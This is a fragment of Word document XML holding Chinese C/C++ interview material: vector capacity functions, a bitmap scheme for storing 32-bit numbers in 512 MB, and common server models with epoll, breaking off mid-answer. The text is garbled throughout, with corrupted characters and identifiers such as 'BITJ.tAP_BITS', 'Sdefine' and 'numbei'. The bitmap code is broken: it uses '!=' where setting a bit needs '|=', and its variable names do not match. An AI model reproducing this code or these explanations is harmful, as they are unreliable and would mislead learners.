          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">可以保存多少元素 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c.reserve(n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分配至少能容纳</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个元素的内存空间</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c.shrink_to_fit()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">将 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>capacity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">()减少为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>size()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>相同大小,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>size。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">vector </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已 经保存元豪个钢。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="630" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="108" w:name="bookmark119"/>
      <w:bookmarkEnd w:id="108"/>
      <w:bookmarkStart w:id="109" w:name="bookmark117"/>
      <w:bookmarkStart w:id="110" w:name="bookmark118"/>
      <w:bookmarkStart w:id="111" w:name="bookmark120"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>因项目需求，需要将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>0~2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>32</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>次方这个区间的数字保存 到内存当中(内存大小为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>4G),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>并且可以实现对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>任意一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个数字 的增删。(先叙述设计思路，再写岀代码)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="109"/>
      <w:bookmarkEnd w:id="110"/>
      <w:bookmarkEnd w:id="111"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>使用位图的方式,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>512M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>内存完全可</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>以存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0-232</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之间的所有数</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 xml:space="preserve">Sdefine BITMAP_BITS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>8</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char *ip_bitmap;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>bool get_memory()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ip_bitmap = malloc( 1024 * 1024 * 512);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(!ip_bitmap)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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return false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1475" w:right="1650" w:bottom="1460" w:left="1714" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void add_number(unsigned int numbei)</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1" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>u32 offset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset = number/ BITJ.tAP_BITS;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ip_bitmap [offset] != (1 «(addr </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>BITJ.tAP_BITS));</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311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void del_number( unsigned int numbei)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>u32 ofset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset = addr/ BITJ.tAP_BITS;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="900"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ip_bitmap [offset] &amp;= ~(1 «(addi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>BITJ.tAP_BITS));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="665"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="112" w:name="bookmark123"/>
      <w:bookmarkEnd w:id="112"/>
      <w:bookmarkStart w:id="113" w:name="bookmark124"/>
      <w:bookmarkStart w:id="114" w:name="bookmark121"/>
      <w:bookmarkStart w:id="115" w:name="bookmark122"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>常见的服务器模型有哪些？你使用过哪些？怎样使用</w:t>
      </w:r>
      <w:bookmarkEnd w:id="113"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="116" w:name="bookmark125"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="114"/>
      <w:bookmarkEnd w:id="115"/>
      <w:bookmarkEnd w:id="116"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>同步阻塞式，多进程，多线程，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>多线程，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>多线程，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">epo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>11+线程池</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="665"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="117" w:name="bookmark128"/>
      <w:bookmarkEnd w:id="117"/>
      <w:bookmarkStart w:id="118" w:name="bookmark126"/>
      <w:bookmarkStart w:id="119" w:name="bookmark127"/>
      <w:bookmarkStart w:id="120" w:name="bookmark129"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>模式下的区别以及注意事项</w:t>
      </w:r>
      <w:bookmarkEnd w:id="118"/>
      <w:bookmarkEnd w:id="119"/>
      <w:bookmarkEnd w:id="120"/>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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式：</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
